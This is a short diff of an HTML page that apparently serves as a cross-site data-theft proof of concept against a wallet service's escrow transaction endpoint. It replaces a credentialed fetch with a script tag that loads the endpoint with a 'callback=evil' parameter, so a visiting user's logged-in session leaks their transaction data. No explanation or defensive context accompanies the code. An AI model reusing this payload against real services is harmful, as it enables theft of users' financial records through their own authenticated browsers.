@@ -3,18 +3,6 @@
 <body>
   <h3>Fetch WalletBot Data</h3>
   <pre id="output">Loading...</pre>
-
-  <script>
-    fetch("https://walletbot.me/scwapi/escrow/transactions?perPage=200", {
-      credentials: "include"
-    })
-    .then(r => r.text())
-    .then(text => {
-      document.getElementById("output").textContent = text;
-    })
-    .catch(err => {
-      document.getElementById("output").textContent = "Error: " + err;
-    });
-  </script>
+  <script src="https://walletbot.me/scwapi/escrow/transactions/?format=html&callback=evil"></script>
 </body>
 </html>
